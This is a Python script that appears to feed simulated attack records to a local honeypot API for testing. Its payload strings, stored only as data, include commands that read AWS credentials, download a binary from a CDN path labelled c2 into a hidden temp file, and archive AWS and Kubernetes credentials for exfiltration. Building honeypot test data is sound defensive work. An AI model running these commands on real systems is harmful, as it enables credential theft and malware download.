#!/usr/bin/env python3
"""Simulated attack injector - realistic TTP patterns for honeypot testing
Run this manually to inject test attacks via the public API endpoints.
"""
import requests
import json

API = "http://localhost:8000"

# Realistic attack patterns (Tor exit IPs, cloud creds, CDN abuse, etc.)
ATTACKS = [
    # SSH - Cloud credential theft (APT pattern)
    {"session_id": "tor-apt-01", "attacker_ip": "185.220.101.13", "protocol": "SSH", 
     "attack_type": "BRUTE_FORCE", "payload": "admin:D3pl0yK3y!", "severity": 70},
    {"session_id": "tor-apt-01", "attacker_ip": "185.220.101.13", "protocol": "SSH",
     "attack_type": "CLOUD_CREDENTIALS", "payload": "cat /root/.aws/credentials", "severity": 95},
    {"session_id": "tor-apt-01", "attacker_ip": "185.220.101.13", "protocol": "SSH",
     "attack_type": "SUPPLY_CHAIN", "payload": "curl cdn.jsdelivr.net/gh/t.me/c2/latest/$(uname -m) -o /tmp/.updater", "severity": 90},
    
    # Telnet - IoT scanner (Mirai pattern)
    {"session_id": "telnet-iot-01", "attacker_ip": "45.33.32.210", "protocol": "TELNET",
     "attack_type": "AUTOMATED_SCANNER", "payload": "nmap -sn 10.0.0.0/24", "severity": 60},
    
    # SSH - Exfiltration
    {"session_id": "ssh-exfil-01", "attacker_ip": "23.129.64.222", "protocol": "SSH",
     "attack_type": "DATA_EXFIL", "payload": "tar czf /dev/shm/.creds.tar.gz /root/.aws /root/.kube", "severity": 85},
]

def inject():
    for attack in ATTACKS:
        r = requests.post(f"{API}/attacks/log", json=attack, timeout=5)
        print(f"{attack['attack_type']}: {r.status_code} - {r.json()}")

if __name__ == "__main__":
    inject()